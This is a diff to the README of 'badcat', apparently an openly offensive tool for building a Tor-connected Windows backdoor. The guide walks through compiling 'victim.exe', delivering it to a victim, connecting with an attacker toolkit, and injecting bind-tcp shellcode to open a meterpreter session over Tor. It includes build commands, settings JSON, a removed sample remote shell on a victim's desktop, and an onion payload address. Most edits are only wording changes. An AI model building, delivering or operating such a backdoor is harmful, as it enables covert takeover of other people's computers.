@@ -145,7 +145,7 @@ Finally we are able to compile the _backdoor_. Every time you build a _backdoor_
 Once you have created the configuration from the example, we are done to build the _backdoor_ using the default configurations, which are the following:
 
 - badcat's basic shell
-- Tor executable directly from The Tor Project, which - unfortunately - is compiled to open a Windows console by default.
+- Tor executable directly from The Tor Project, which - unfortunately - is compiled to open a Windows console by default. See [Invisible _backdoor_](#invisible-backdoor) section of how to fix that.
 
 Build the _backdoor_ targeting Windows x64:
 
@@ -160,7 +160,7 @@ $ file target/x86_64-pc-windows-gnu/release/victim.exe
 target/x86_64-pc-windows-gnu/release/victim.exe: PE32+ executable (GUI) x86-64, for MS Windows
 ```
 
-That seems fine. You may now had noticed that a new file called `hosts.json` was created. This is the configuration file used to connect to the _victim_ using the attacker toolkit.
+That seems fine. You may now had noticed that a new file called `hosts.json` was created. That is the configuration file used to connect to the _victim_ using the attacker toolkit.
 
 ### 4. Delivery and Control
 
@@ -170,40 +170,7 @@ Deliver the generated executable to the _victim_ and execute it. In the image be
 
 Now configure Tor at your attacker machine and connect to the victim through the attacker toolkit. The attacker toolkit already uses the default Tor socks address.
 
-```bash
-$ ./attacker -f hosts.json
-Badcat attacker toolkit. Connect to your hosts
-Type help for commands.
-
-# list
-0 my-dev-badcat test false  a5w42o
-# connect 0
-trying to connect (attempt 0)...
-connected to: Ip(0.0.0.0:0)
-opening the default badcat shell...
-
-note: when you exit the shell, keep pressing Enter until it exits
-
-
-
-Microsoft Windows [Version 10.0.19043.928]
-(c) Microsoft Corporation. All rights reserved.
-
-C:\Users\User\Desktop>dir
-dir
- Volume in drive C has no label.
- Volume Serial Number is FC95-D1E1
-
- Directory of C:\Users\User\Desktop
-
-11/25/2021  11:10 AM    <DIR>          .
-11/25/2021  11:10 AM    <DIR>          ..
-11/24/2021  11:30 PM        27,995,815 victim.exe
-               1 File(s)     27,995,815 bytes
-               2 Dir(s)     351,571,968 bytes free
-
-C:\Users\User\Desktop>
-```
+IMAGE
 
 ## Advanced Usage
 
@@ -220,19 +187,19 @@ $ docker build -t wintor .
 $ docker run -v ./target:/target --rm wintor
 ```
 
-Note that it provides a volume mounted at `/target` directory. This is the location where the Tor binary will be copied into.
+Note the latter command provides a volume mounted at `/target` directory. This is the location where the Tor binary will be copied into.
 
-Once the compilation finished - it take a while -, check the generated binary:
+Once the compilation finished - it take a while, check the generated binary:
 
 ```bash
-$ file target/tor.exe                       
+$ file target/tor.exe
 target/tor.exe: PE32+ executable (GUI) x86-64, for MS Windows
 ```
 
 Now you have to tell badcat to use your newly Tor binary. Badcat understands Tor binaries in two forms: a remote URL or a local file. We'll use a local file pointing at a directory which the binary is located. You cannot just throw your binary there, you have follow by the rules:
 
 1. Binary must be inside an `App` directory.
-2. Binary name must equal `tor.executable` setting. Example:
+2. Binary name must equal the `tor.executable` setting. Example:
 
 The following directory structure:
 
@@ -243,7 +210,7 @@ victim
 
 Then your `settings.json` should look like below:
 
-Note that your directory is defined at `tor.download_url.windows`, and the location is relative to `victim` directory.
+**Note: your directory is defined at `tor.download_url.windows`, and the location is relative to `victim` directory.**
 
 ```json
 {
@@ -264,7 +231,7 @@ Note that your directory is defined at `tor.download_url.windows`, and the locat
     },
     "payload": {
         "enabled": false,
-        "file": "../payload.exe",
+        "hex": "",
         "bind_port": "9001"
     }
 }
@@ -274,7 +241,7 @@ Now you compile, deliver and control the _backdoor_ as usual.
 
 ### Executing Custom Payload
 
-One of the advanced features of badcat is ability to execute custom payload. Let me elaborate: one can inject a payload into executable memory and jump into it, just after the _attacker_ connected to the _server_. So what kind of usefull payloads one might inject? Bind tcp ones. Badcat actually expect you to use a bind tcp payload, it can't force you to though.
+One of the advanced features of badcat is the ability to execute custom payload. Let me elaborate: one can inject a payload into executable memory and jump into it, just after the _attacker_ connected to the _server_. So what kind of usefull payloads one might inject? Bind tcp ones. Badcat actually prepares a port on the _server_ for you to use a bind tcp payload, you can set the payload to anything wanted though.
 
 Examples:
 
@@ -309,7 +276,7 @@ First translate your payload to hexadecimal. Then enable payload at your `settin
 
 Now compile your _backdoor_ and deliver as usual.
 
-When connecting, the attacker toolkit will execute the payload for you, but nothing will really show up. Instead you'll be able to connect directly to your shell with using the onion address and the port as `settings.payload.bind_port` 4444 in our example.
+When connecting, the attacker toolkit will execute the payload for you, but nothing will really show up. Instead you'll be able to connect directly to your shell using the onion address and the port as `settings.payload.bind_port` 4444 in our example.
 
 ```bash
 $ ./attacker -f hosts.json
@@ -380,7 +347,7 @@ connected to: Ip(0.0.0.0:0)
 Your payload should be accessible now at: aqti2jzrbmniqsnwmi3zmxxy3edynawa472ywdj42nk2wox6akpkodqd.onion:PAYLOAD_PORT
 ```
 
-After you have connected, fire up `msfconsole` using `proxychains` in order to open a meterpreter session through the Tor network. It's fundamental that msfconsole is proxied through the Tor network.
+After you have connected, fire up `msfconsole` - using `proxychains` or something similar - in order to open a meterpreter session through the Tor network. It's fundamental that msfconsole is proxied through the Tor network or one will not be able to connect to the _server_.
 
 ![Msfconsole opened with session from badcat](https://user-images.githubusercontent.com/28604565/143482772-40267d27-9e9e-4f41-80e9-c956e5432be0.png)
 
